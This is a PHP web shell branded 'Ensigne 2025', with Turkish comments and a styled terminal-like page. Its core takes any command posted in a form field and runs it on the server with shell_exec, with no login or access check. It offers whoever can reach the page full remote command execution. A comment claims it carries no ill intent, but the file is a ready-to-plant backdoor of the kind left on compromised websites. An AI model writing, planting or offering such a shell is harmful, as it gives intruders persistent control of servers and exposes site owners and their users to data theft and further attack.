<?php
// Discord ensigne
// Shelli Sıkıldığımdan Dolayı Yazdım Hiçbir Art Niyet İle Yazılmamıştır!

session_start(); 


if (!isset($_SESSION['output'])) {
    $_SESSION['output'] = [];
}

$output = '';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["command"])) {
        // Kullanıcıdan gelen komut
        $command = escapeshellcmd($_POST["command"]);
        
        if ($command == 'clear' || $command == 'cls') {
            $_SESSION['output'] = []; // Tüm çıktıları temizle
            $output = ''; // Çıktıyı sıfırla
        } else {

            $output = shell_exec($command . " 2>&1");

            $_SESSION['output'][] = "root@Ensigne:~$ " . htmlspecialchars($_POST["command"]);
            $_SESSION['output'][] = htmlspecialchars($output);
        }
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linux Terminal - Kırmızı Siyah</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #111;
            color: white;
            margin: 0;
            overflow: hidden;
            cursor: url('https://www.gstatic.com/ui/v1/icons/mail/rfr/logo_32.png'), auto; /* Farenin şekli */
        }
        .navbar {
            background-color: rgba(144, 0, 0, 0.8);
            border-radius: 20px;
        }
        .terminal {
            background-color: #222;
            border: 2px solid #900;
            border-radius: 20px;
            padding: 20px;
            font-family: monospace;
            color: #0f0;
            box-shadow: 0px 0px 10px rgba(255, 0, 0, 0.5);
            position: relative;
            z-index: 10;
            height: 600px; 
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .terminal-header {
            display: flex;
            justify-content: space-between;
            background-color: rgba(144, 0, 0, 0.8);
            padding: 10px;
            border-radius: 18px 18px 0 0;
        }
        .terminal-body {
            padding: 15px;
            min-height: 300px;
            max-height: 500px;
            overflow-y: scroll;
            margin-bottom: 15px;
            flex-grow: 1; 
        }
        .btn-custom {
            background-color: #900;
            color: white;
            border-radius: 20px;
        }
        .btn-custom:hover {
            background-color: #b00;
        }
        .dot {
            height: 12px;
            width: 12px;
            margin: 3px;
            background-color: white;
            border-radius: 50%;
            display: inline-block;
        }
        .terminal-input {
            background: none;
            border: none;
            color: #0f0;
            font-family: monospace;
            width: 100%;
            outline: none;
            caret-color: #900; /* Siyah cursor */
        }
        .output {
            color: #0f0;
            white-space: pre-wrap;
        }
        #particles-js {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        /* Özelleştirilmiş Scrollbar */
        .terminal-body::-webkit-scrollbar {
            width: 12px;
        }
        .terminal-body::-webkit-scrollbar-track {
            background: #333;
        }
        .terminal-body::-webkit-scrollbar-thumb {
            background: #900;
            border-radius: 6px;
        }
        .terminal-body::-webkit-scrollbar-thumb:hover {
            background: #b00;
        }
    </style>
</head>
<body>
    <div id="particles-js"></div> 
    <nav class="navbar navbar-dark mt-3 mx-3 p-2">
        <div class="container">
            <a class="navbar-brand" href="#">Ensigne 2025 | Web Shell</a>
        </div>
    </nav>
    <div class="container mt-5">
        <div class="terminal">
            <div class="terminal-header">
                <div>
                    <span class="dot bg-danger"></span>
                    <span class="dot bg-warning"></span>
                    <span class="dot bg-success"></span>
                </div>
                <span class="text-white">Discord@<span style="color: red; font-weight: bold;">ensigne</span></span>
            </div>
            <div class="terminal-body" id="terminal-body">
                <p class="output">Welcome to Ensigne 2025 Terminal</p>

                <?php
                if (empty($output)) {
                    $figletOutput = shell_exec('figlet ENSİGNE');
                    echo "<p class='output'>" . nl2br(htmlspecialchars($figletOutput)) . "</p>";
                }

                // Eğer session'da çıktı varsa, hepsini yazdırıyoruz
                foreach ($_SESSION['output'] as $line) {
                    echo "<p class='output'>" . nl2br(htmlspecialchars($line)) . "</p>";
                }
                ?>
            </div>
            <form method="POST" class="d-flex">
                <span class="text-white">root@<span style="color: red; font-weight: bold;">Ensigne</span>:~$</span>
                <input type="text" name="command" class="terminal-input ms-2" autofocus>
                <button type="submit" style="display: none;"></button>
            </form>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
    <script>
        // Arka plan 
        if (document.getElementById('particles-js').children.length === 0) {
            particlesJS('particles-js', {
                "particles": {
                    "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                    "color": { "value": "#ffffff" },
                    "shape": { "type": "circle" },
                    "opacity": { "value": 0.5 },
                    "size": { "value": 5, "random": true },
                    "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1 },
                    "move": { "enable": true, "speed": 6, "direction": "none" }
                },
                "interactivity": {
                    "events": {
                        "onhover": { "enable": true, "mode": "repulse" },
                        "onclick": { "enable": true, "mode": "push" }
                    },
                    "modes": {
                        "repulse": { "distance": 200 },
                        "push": { "particles_nb": 4 }
                    }
                },
                "retina_detect": true
            });
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
